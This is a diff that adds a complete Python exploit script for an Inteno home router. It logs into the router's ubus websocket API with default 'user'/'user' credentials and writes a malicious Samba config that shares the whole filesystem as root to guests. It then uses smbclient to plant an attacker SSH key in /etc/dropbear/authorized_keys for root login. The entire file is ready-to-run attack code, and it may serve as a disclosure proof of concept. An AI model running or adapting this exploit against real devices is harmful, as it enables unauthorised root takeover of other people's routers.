@@ -1,0 +1,101 @@
+#!/usr/bin/python
+
+import json
+import sys
+import subprocess
+import socket
+import os
+from websocket import create_connection
+
+def ubusAuth(host, username, password):
+    ws = create_connection("ws://" + host, header = ["Sec-WebSocket-Protocol: ubus-json"])
+    req = json.dumps({"jsonrpc":"2.0","method":"call",
+        "params":["00000000000000000000000000000000","session","login",
+        {"username": username,"password":password}],
+        "id":666})
+    ws.send(req)
+    response =  json.loads(ws.recv())
+    ws.close()
+    try:
+        key = response.get('result')[1].get('ubus_rpc_session')
+    except IndexError:
+        return(None)
+    return(key)
+
+def ubusCall(host, key, namespace, argument, params={}):
+    ws = create_connection("ws://" + host, header = ["Sec-WebSocket-Protocol: ubus-json"])
+    req = json.dumps({"jsonrpc":"2.0","method":"call",
+        "params":[key,namespace,argument,params],
+        "id":666})
+    ws.send(req)
+    response =  json.loads(ws.recv())
+    ws.close()
+    try:
+        result = response.get('result')[1]
+    except IndexError:
+        if response.get('result')[0] == 0:
+            return(True)
+        return(None)
+    return(result)
+
+if __name__ == "__main__":
+    host = "192.168.1.1"
+    sshkey = "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAkQMU/2HyXNEJ8gZbkxrvLnpSZ4Xz+Wf3QhxXdQ5blDI5IvDkoS4jHoi5XKYHevz8YiaX8UYC7cOBrJ1udp/YcuC4GWVV5TET449OsHBD64tgOSV+3s5r/AJrT8zefJbdc13Fx/Bnk+bovwNS2OTkT/IqYgy9n+fKKkSCjQVMdTTrRZQC0RpZ/JGsv2SeDf/iHRa71keIEpO69VZqPjPVFQfj1QWOHdbTRQwbv0MJm5rt8WTKtS4XxlotF+E6Wip1hbB/e+y64GJEUzOjT6BGooMu/FELCvIs2Nhp25ziRrfaLKQY1XzXWaLo4aPvVq05GStHmTxb+r+WiXvaRv1cbQ=="
+    user = "user"
+    pasw = "user"
+    conf = """[global]
+	netbios name = IntenoSMB 
+	workgroup = IntenoSMB
+	server string = IntenoSMB
+	syslog = 10
+	encrypt passwords = true
+	passdb backend = smbpasswd
+	obey pam restrictions = yes
+	socket options = TCP_NODELAY
+	unix charset = UTF-8
+	preferred master = yes
+	os level = 20
+	security = user
+	guest account = root
+	smb passwd file = /etc/samba/smbpasswd
+	interfaces = 192.168.1.1/24 br-lan 
+	bind interfaces only = yes
+	wide links = no
+
+[pwn]
+	path = /
+	read only = no
+	guest ok = yes
+	create mask = 0700
+	directory mask = 0700
+	force user = root
+"""
+
+    print("Authenticating...")
+    key = ubusAuth(host, user, pasw)
+    if (not key):
+        print("Auth failed!")
+        sys.exit(1)
+    print("Got key: %s" % key)
+
+    print("Dropping evil Samba config...")
+    ltc = ubusCall(host, key, "file", "write_tmp",
+        {"path":"/tmp/etc/smb.conf", "data": conf})
+    if (not ltc):
+        print("Failed to write evil config!")
+        sys.exit(1)
+
+    print("Creating temp file for key...")
+    with open(".key.tmp","a+") as file:
+        file.write(sshkey)
+        path = os.path.realpath(file.name)
+
+    print("Dropping key...")
+    subprocess.run("smbclient {0}pwn -U% -c 'put {1} /etc/dropbear/authorized_keys'".format(r"\\\\" + host + r"\\", path),
+        shell=True, check=True)
+    print("Key dropped")
+
+    print("Cleaning up...")
+    os.remove(path)
+
+    print("Exploitation complete. Try \"ssh root@%s\"" % host)
